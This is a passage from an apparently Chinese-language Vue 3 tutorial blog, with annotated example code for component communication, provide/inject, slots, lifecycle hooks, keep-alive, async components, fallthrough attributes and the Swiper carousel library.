class="line">&lt;h3&gt;Main&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;搜索内容为：&#123;&#123; search &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;Child @searchEvent=&quot;getSearch&quot; /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;./Child.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            search: &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    components: &#123;</span><br><span class="line">        Child</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        getSearch(data)&#123;</span><br><span class="line">            this.search = data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">搜索：&lt;input type=&quot;text&quot; v-model=&quot;search&quot;&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            search: &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    //侦听器</span><br><span class="line">    watch: &#123;</span><br><span class="line">        search(newValue,oldValue)&#123;</span><br><span class="line">            this.$emit(&quot;searchEvent&quot;, newValue)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="8-props实现子传父"><a href="#8-props实现子传父" class="headerlink" title="8 props实现子传父"></a>8 props实现子传父</h3><blockquote><p><code>props</code>可以传递数据，因此可以利用子组件传递函数，在函数中携带参数，从而利用props实现子传父。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;ComponentA&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;父元素:&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;Child title=&quot;标题&quot; :onEvent=&quot;dataFn&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;./Child.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            message: &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    components: &#123;</span><br><span class="line">        Child</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        dataFn(data)&#123;</span><br><span class="line">            this.message = data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Child&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; title &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;!-- 类似回调函数 --&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; onEvent(&#x27;传递数据&#x27;)&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    props: &#123;</span><br><span class="line">        title: String,</span><br><span class="line">onEvent: Function</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="9-依赖注入"><a href="#9-依赖注入" class="headerlink" title="9 依赖注入"></a>9 依赖注入</h3><blockquote><p>正常情况下，如果祖父的数据要传递给孙子，需要先传递给父亲，再传递给孙子，这一问题成为”prop 逐级透传”。</p><p><code>provide</code>和<code>inject</code>可以帮助我们解决这一问题。一个父组件相对于其所有的后代组件，会作为依赖提供者。任何后代的组件树，无论层级有多深，都可以注入由父组件提供给整条链路的依赖。</p><p><code>provide</code>和<code>inject</code>只能由上到下传递，不能反向传递。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- grandparent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Grandparent&lt;/h3&gt;</span><br><span class="line">&lt;Parent/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Parent from &quot;./Parent.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">message: &quot;Grandparent Data&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">// 通过Data赋值</span><br><span class="line">    provide()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            message: this.message</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">// 直接赋值</span><br><span class="line">    // provide:&#123;</span><br><span class="line">   //  message: &quot;爷爷的财产&quot;</span><br><span class="line">    // &#125;,</span><br><span class="line">    components:&#123;</span><br><span class="line">        A</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- parent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Parent&lt;/h3&gt;</span><br><span class="line">&lt;Child /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;./child.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">    components: &#123;</span><br><span class="line">        Child</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- child.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Child&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">inject: [&quot;message&quot;]</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局注册，在main.js中，注册后再任意组件中都可以用</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Header</span> <span class="keyword">from</span> <span class="string">&quot;./components/Header.vue&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在创建app后，挂载app前写组件，全局提供数据</span></span><br><span class="line">app.<span class="title function_">provide</span>(name,data)</span><br><span class="line">app.<span class="title function_">provide</span>(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;I&#x27;m a message&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>( <span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="10-插槽"><a href="#10-插槽" class="headerlink" title="10 插槽"></a>10 插槽</h3><blockquote><p>用于在组件之间传递模板。</p><p><code>&lt;slot&gt;</code>元素是一个插槽出口（slot outlet），标示了父元素提供的插槽内容（slot content）将在哪里被渲染。</p><p>使用时，父元素模板定义子元素，在子元素中写模板。子元素使用<code>&lt;slot&gt;</code>双标签调用出父元素的定义的内容。</p><p>插槽中可以书写动态数据，动态数据是存储在父组件中的。</p><p>插槽可以有默认值，当父组件的插槽中内容为空时，将显示子组件中插槽标签中的内容。</p><p>具名插槽：给插槽一个属性值，用于区分不同的插槽。写法是<code>&lt;template v-slot:name&gt;</code>，可以简写成<code>&lt;template #name&gt;</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 父元素中的子元素标签用双标签，在标签中写模板 --&gt;</span><br><span class="line">&lt;Child&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">            &lt;h3&gt;slot title&lt;/h3&gt;</span><br><span class="line">            &lt;p&gt;slot content&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&#123;&#123; content &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/Child&gt;</span><br><span class="line">&lt;!-- 通过名字区分插槽 --&gt;</span><br><span class="line">&lt;Child&gt;</span><br><span class="line">&lt;template v-slot:first&gt;</span><br><span class="line">&lt;h3&gt; I&#x27;m first &lt;/h3&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;template #second&gt;</span><br><span class="line">&lt;h3&gt; I&#x27;m second&lt;/h3&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;/Child&gt;</span><br><span class="line">&lt;!-- 使用父子组件的数据，:name=&quot;别名&quot;，然后点出里面的属性 --&gt;</span><br><span class="line">    &lt;Child v-slot:second=&quot;childData&quot;&gt;</span><br><span class="line">        &lt;h3&gt;&#123;&#123; message &#125;&#125; -- &#123;&#123; childData.msg &#125;&#125;&lt;/h3&gt;</span><br><span class="line">    &lt;/Child&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;./Child.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            content: &quot;Hello World!&quot;,</span><br><span class="line">            message: &quot;Parent Data!&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    components: &#123;</span><br><span class="line">        Child</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Child&lt;/h3&gt;</span><br><span class="line">&lt;!-- 使用插槽。注：标签名不能改--&gt;</span><br><span class="line">    &lt;!-- 将父组件中插槽中的内容注释后，将显示下列默认内容 --&gt;</span><br><span class="line">&lt;slot&gt;无name默认值&lt;/slot&gt;</span><br><span class="line">&lt;!-- 用name指向父组件中v-slot指向的模板 --&gt;</span><br><span class="line">&lt;slot name=&quot;first&quot;&gt;first默认值&lt;/slot&gt;</span><br><span class="line">&lt;!-- 传递msg数据给父组件 --&gt;</span><br><span class="line">&lt;slot name=&quot;second&quot; :msg=&quot;childMessage&quot;&gt;second默认值&lt;/slot&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            childMessage:&quot;Child Data!&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="11-组件生命周期"><a href="#11-组件生命周期" class="headerlink" title="11 组件生命周期"></a>11 组件生命周期</h3><blockquote><p>生命周期函数</p><ul><li>创建期：beforeCreate、created</li><li>挂载期：beforeMount、mounted</li><li>更新期：beforeUpdate、updated</li><li>销毁期：beforeUnmount、unmounted</li></ul><p>当组件进入对应的时期后，将执行对应的函数的内容。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;组件生命周期&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;button @click=&quot;updateHandle&quot;&gt;更新数据&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">message: &quot;老数据&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">updateHandle()&#123;</span><br><span class="line">this.message=&quot;新数据&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">beforeCreate()&#123;</span><br><span class="line">console.log(&quot;组件创建之前&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">created()&#123;</span><br><span class="line">console.log(&quot;组件创建之后&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">beforeMount()&#123;</span><br><span class="line">console.log(&quot;组件渲染之前&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">mounted()&#123;</span><br><span class="line">console.log(&quot;组件创建之后&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">beforeupdate()&#123;</span><br><span class="line">console.log(&quot;数据更新之前&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">updated()&#123;</span><br><span class="line">console.log(&quot;数据更新之后&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">beforeUnmount()&#123;</span><br><span class="line">console.log(&quot;组件卸载之前&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">unmounted()&#123;</span><br><span class="line">console.log(&quot;组件卸载之后&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="12-生命周期应用"><a href="#12-生命周期应用" class="headerlink" title="12 生命周期应用"></a>12 生命周期应用</h3><blockquote><p>常见应用：</p><ul><li>通过<code>ref</code>获取元素DOM结构。在<code>beforeMount()</code>前无法获得，因为组件未挂载。在<code>mounted()</code>后可以操作DOM结构，此时组件挂载。</li><li>模拟网络请求渲染数据。在<code>beforeCreate()</code>前无法获得，因为组件未创建，没有<code>data()</code>，数据无法存储。在<code>created()</code>后则可以将获得的数据存储在<code>data()</code>中。但是实际上为了让网页先显示结构再显示数据，所以一般是在<code>mounted()</code>中作数据获得的操作，因为先获得数据没有结构也没有实际作用。</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 读取DOM结构 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;组件生命周期函数应用&lt;/h3&gt;</span><br><span class="line">&lt;p ref=&quot;name&quot;&gt;百战程序员&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">beforeMount()&#123;</span><br><span class="line">        // 此时组件未挂载，获得undefined</span><br><span class="line">console.log(this.$refs.name); </span><br><span class="line">&#125;,</span><br><span class="line">mounted()&#123;</span><br><span class="line">        // 此时组件挂载，获得百战程序员</span><br><span class="line">console.log(this.$refs.name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 模拟网络请求渲染数据 --&gt;</span><br><span class="line">&lt;!-- 结果只有mio，因为在创建之前没有banner，banner还是undefined --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">        &lt;li v-for=&quot;(item,index) of banner&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">            &lt;h3&gt;&#123;&#123; item.title &#125;&#125;&lt;/h3&gt;</span><br><span class="line">            &lt;p&gt;&#123;&#123; item.content &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            banner: []</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">beforeCreate()&#123;</span><br><span class="line">        // 模拟网络获得数据</span><br><span class="line">this.banner = [</span><br><span class="line">&#123;</span><br><span class="line">title: &quot;uyi&quot;,</span><br><span class="line">content: &quot;guitar&quot;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">    created()&#123;</span><br><span class="line">        // 模拟网络获得数据</span><br><span class="line">        this.banner.push(</span><br><span class="line">        &#123;</span><br><span class="line">            title: &quot;mio&quot;,</span><br><span class="line">            content: &quot;bass&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125;,</span><br><span class="line">    // 为了让网页先显示结构再显示数据，所以一般是在mounted中作数据获得的操作</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        this.banner.push(</span><br><span class="line">        &#123;</span><br><span class="line">            title: &quot;tsumugi&quot;,</span><br><span class="line">            content: &quot;keyboard&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="13-组件切换"><a href="#13-组件切换" class="headerlink" title="13 组件切换"></a>13 组件切换</h3><blockquote><p>有些场景会需要在两个或多个场景之间来回切换，比如Tab界面。</p><p>当使用<code>&lt;component is=&quot;...&quot;&gt;</code>来在多个组件间作切换时，被切换掉的组件会被卸载。我们可以通过<code>&lt;keep-alive&gt;</code>组件强制被切换掉的组件仍然保持“存活”的状态。</p><p>在下列案例中，如果不加上<code>&lt;keep-alive&gt;</code>，切换组件时，组件会被卸载，这样更新了数据后再切换数据也会重置。但是加上<code>&lt;keep-alive&gt;</code>后组件将不会卸载，数据也就能保存下来。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Parent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- keep-alive必须包裹确定的组件，不能再包裹button，否则报错 --&gt;</span><br><span class="line">&lt;keep-alive&gt;</span><br><span class="line">        &lt;!-- 加载组件，is绑定 --&gt;</span><br><span class="line">&lt;component :is=&quot;tabComponent&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line">&lt;button @click=&quot;changeHandle&quot;&gt;切换组件&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import A from &quot;./A.vue&quot;</span><br><span class="line">import B from &quot;./B.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">            // 组件名绑定，要用字符串</span><br><span class="line">tabComponent : &quot;A&quot;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">components:&#123;A,B&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line">changeHandle()&#123;</span><br><span class="line">            // 切换组件，要用字符串</span><br><span class="line">this.tabComponent = this.tabComponent == &quot;A&quot; ? &quot;B&quot; : &quot;A&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- A.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;我是A&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;button @click=&quot;updateHandle&quot;&gt;更新数据&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">message: &quot;老数据&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    beforeUnmount()&#123;</span><br><span class="line">        console.log(&quot;组件卸载之前&quot;);</span><br><span class="line">    &#125;,</span><br><span class="line">    unmounted()&#123;</span><br><span class="line">        console.log(&quot;组件卸载之后&quot;);</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        updateHandle()&#123;</span><br><span class="line">            this.message = &quot;新数据&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- B.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;p&gt;我是B&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    beforeUnmount()&#123;</span><br><span class="line">console.log(&quot;组件卸载之前&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">unmounted()&#123;</span><br><span class="line">console.log(&quot;组件卸载之后&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="14-异步组件"><a href="#14-异步组件" class="headerlink" title="14 异步组件"></a>14 异步组件</h3><blockquote><p>在大型项目中，我们可能需要拆分应用为更小的块，并仅在需要时再从服务器加载相关组件。Vue提供了<code>defineAsyncComponent</code>方法来实现此功能。</p><p>下列案例中，若不做成异步，则在网络请求中会一次性加载A，B。若将B做成了异步请求，则一开始并不会请求B，当用户点击切换后才会在网络中请求B。请求后将保存在本地，多次切换后都不会再发送网络请求。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Parent.vue。A.vue和B.vue在上一节 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;component :is=&quot;tabComponent&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;button @click=&quot;changeHandle&quot;&gt;切换组件&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 导入组件</span><br><span class="line">import &#123; defineAsyncComponent &#125; from &#x27;vue&#x27;</span><br><span class="line">import A from &quot;./A.vue&quot;</span><br><span class="line">// 设置成异步</span><br><span class="line">const B = defineAsyncComponent(() =&gt; import(&#x27;./B.vue&#x27;))</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">            // 组件名绑定，要用字符串</span><br><span class="line">tabComponent : &quot;A&quot;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">components:&#123;A,B&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line">changeHandle()&#123;</span><br><span class="line">            // 切换组件，要用字符串</span><br><span class="line">this.tabComponent = this.tabComponent == &quot;A&quot; ? &quot;B&quot; : &quot;A&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="四、Vue其他"><a href="#四、Vue其他" class="headerlink" title="四、Vue其他"></a>四、Vue其他</h2><h3 id="1-透传-Attributes"><a href="#1-透传-Attributes" class="headerlink" title="1 透传 Attributes"></a>1 透传 Attributes</h3><blockquote><p><code>“透传attribute”</code>指的是传递给一个组件，却没有被该组件声明为<code>props</code>或<code>emits</code>的<code>attribute</code>或者<code>v-on</code>事件监听器。最常见的例子就是<code>class</code>、<code>style</code>和<code>id</code>。当一个组件以单个元素为根作渲染时，透传的<code>attribute</code>会自动被添加到根元素上。</p><p>注：在实际场景中并不常用。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;Child class=&quot;attr-container&quot; /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;./Child.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">    components: &#123;</span><br><span class="line">        Child</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 必须是唯一根元素 --&gt;</span><br><span class="line">&lt;h3&gt;透传属性&lt;/h3&gt;</span><br><span class="line">&lt;!-- &lt;p&gt;再多加一个标签就会失效&lt;/p&gt; --&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 禁用属性继承，添加后class将不会继承下来</span><br><span class="line">// export default&#123;</span><br><span class="line">//    inheritAttrs: false</span><br><span class="line">// &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.attr-container&#123;</span><br><span class="line">    color: red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="2-引入第三方库"><a href="#2-引入第三方库" class="headerlink" title="2 引入第三方库"></a>2 引入第三方库</h3><h4 id="2-1-Swiper"><a href="#2-1-Swiper" class="headerlink" title="2.1 Swiper"></a>2.1 Swiper</h4><blockquote><p>常用动画库：<a href="https://swiperjs.com/vue">offifcial::Swiper Vue.js</a></p><p>首先：<code>npm i swiper</code>进行安装</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 导航+轮播图案例 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 导航栏属性设置 --&gt;</span><br><span class="line">&lt;swiper :navigation=&quot;true&quot; :modules=&quot;modules&quot; class=&quot;mySwiper&quot;&gt;</span><br><span class="line">        &lt;!-- 单个栏目设置 --&gt;</span><br><span class="line">    &lt;swiper-slide &gt;</span><br><span class="line">&lt;div class=&quot;slide slide1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/swiper-slide&gt;</span><br><span class="line">    &lt;swiper-slide &gt;</span><br><span class="line">&lt;div class=&quot;slide slide2&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/swiper-slide&gt;</span><br><span class="line">&lt;swiper-slide &gt;</span><br><span class="line">&lt;div class=&quot;slide slide3&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/swiper-slide&gt;</span><br><span class="line">&lt;swiper-slide &gt;</span><br><span class="line">&lt;div class=&quot;slide slide4&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/swiper-slide&gt;</span><br><span class="line">&lt;swiper-slide &gt;</span><br><span class="line">&lt;div class=&quot;slide slide5&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/swiper-slide&gt;</span><br><span class="line">  &lt;/swiper&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 导入轮播图</span><br><span class="line">import &#123; Swiper, SwiperSlide &#125; from &#x27;swiper/vue&#x27;;</span><br><span class="line">// 导入导航栏</span><br><span class="line">import &#123; Navigation &#125; from &#x27;swiper/modules&#x27;;</span><br><span class="line">// 导入对应css</span><br><span class="line">import &#x27;swiper/css&#x27;;</span><br><span class="line">import &#x27;swiper/css/navigation&#x27;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    // 导航栏注册</span><br><span class="line">setup() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            modules: [Navigation],</span><br><span class="line">        &#125;</span><br><span class="line">&#125;,</span><br><span class="line">    // 轮播图注册</span><br><span class="line">components: &#123;</span><br><span class="line">Swiper,</span><br><span class="line">SwiperSlide,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.swiper-slide &#123;</span><br><span class="line">height: 405px;</span><br><span class="line">display: flex;</span><br><span class="line">align-items: center;</span><br><span class="line">justify-content: center;</span><br><span class="line">&#125;</span><br><span class="line">/* 切割图片 */</span><br><span class="line">.slide&#123;</span><br><span class="line">height: 405px;</span><br><span class="line">width: 144px;</span><br><span class="line">&#125;</span><br><span class="line">.slide1 &#123;</span><br><span class="line">background: url(&quot;src/assets/img/mygo.png&quot;) no-repeat 0px 0px;</span><br><span class="line">&#125;</span><br><span class="line">.slide2 &#123;</span><br><span class="line">background: url(&quot;src/assets/img/mygo.png&quot;) no-repeat -144px 0px; </span><br><span class="line">&#125;</span><br><span class="line">.slide3 &#123;</span><br><span class="line">background: url(&quot;src/assets/img/mygo.png&quot;) no-repeat -288px 0px;</span><br><span class="line">&#125;</span><br><span class="line">.slide4 &#123;</span><br><span class="line">background: url(&quot;src/assets/img/mygo.png&quot;) no-repeat -432px 0px; </span><br><span class="line">&#125;</span><br><span class="line">.slide5 &#123;</span><br><span class="line">background: url(&quot;src/assets/img/mygo.png&quot;) no-repeat -576px 0px; 